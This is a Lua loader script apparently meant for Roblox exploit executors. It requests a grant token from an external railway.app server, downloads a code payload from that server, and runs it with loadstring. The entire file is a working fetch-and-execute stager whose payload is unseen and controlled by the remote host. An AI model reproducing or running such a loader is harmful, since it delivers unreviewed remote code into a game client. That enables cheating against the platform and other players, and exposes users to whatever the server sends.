local HttpService = game:GetService("HttpService")
local requestFn = (syn and syn.request) or (http and http.request) or http_request or request
assert(requestFn, "No request function available")

local API = "https://worker-production-6034.up.railway.app"

local grantResp = requestFn({
    Url = API .. "/grant",
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = "{}"
})
assert(grantResp, "grant: no response")
print("grant status", grantResp.StatusCode, "body", grantResp.Body)

local grantJson = HttpService:JSONDecode(grantResp.Body or "{}")
assert(grantJson and grantJson.ok and type(grantJson.g) == "string", "grant failed: " .. tostring(grantResp.Body))

-- Use requestFn for download too (important with context binding)
local dlResp = requestFn({
    Url = API .. "/download?g=" .. HttpService:UrlEncode(grantJson.g),
    Method = "GET"
})
assert(dlResp, "download: no response")
print("download status", dlResp.StatusCode, "len", #(dlResp.Body or 0), "body preview", string.sub(dlResp.Body or "", 1, 200))

assert(tonumber(dlResp.StatusCode) == 200, "download failed: " .. tostring(dlResp.Body))
local code = dlResp.Body or ""
assert(#code > 0, "empty payload")

local fn, err = loadstring(code)
assert(fn, "loadstring error: " .. tostring(err))
fn()
